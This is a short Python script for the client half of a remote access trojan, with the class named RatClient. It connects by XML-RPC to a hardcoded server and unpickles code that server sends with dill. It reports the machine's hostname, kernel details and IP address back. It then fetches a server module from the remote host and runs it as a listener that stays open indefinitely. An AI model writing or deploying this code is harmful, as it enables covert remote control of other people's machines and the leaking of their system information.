#!/usr/local/bin/python3
from xmlrpc import client
import dill

server_ip = '192.168.1.6'
server_port = 4000


def convert_to(obj):
    return client.Binary(dill.dumps(obj))


def convert_from(obj):
    return dill.loads(obj.data)


class RatClient():

    def __init__(self):
        self.rat_client = client.ServerProxy("http://{0}:{1}"
                                             .format(server_ip, server_port))

    def get_system_information(self, os, socket):
        host_name = socket.gethostname()
        kernel_info = os.uname()
        ip_address = socket.gethostbyname(host_name)
        result = [host_name, kernel_info, ip_address]
        return result


if __name__ == '__main__':
    rat = RatClient()
    req_libs = convert_from(rat.rat_client.rcv_req_libs())
    os = req_libs[0]
    socket = req_libs[1]
    rat.rat_client.register_client(convert_to(rat.get_system_information(os, socket)))
    server_package = convert_from(rat.rat_client.create_client_server())
    server = server_package[0]
    client_server_module = server_package[1]
    client_server = client_server_module(server_ip="192.168.1.6", server_port=4001)
    client_server.rat_server.register_function(client_server.register_client, 'register_client')
    client_server.rat_server.serve_forever()
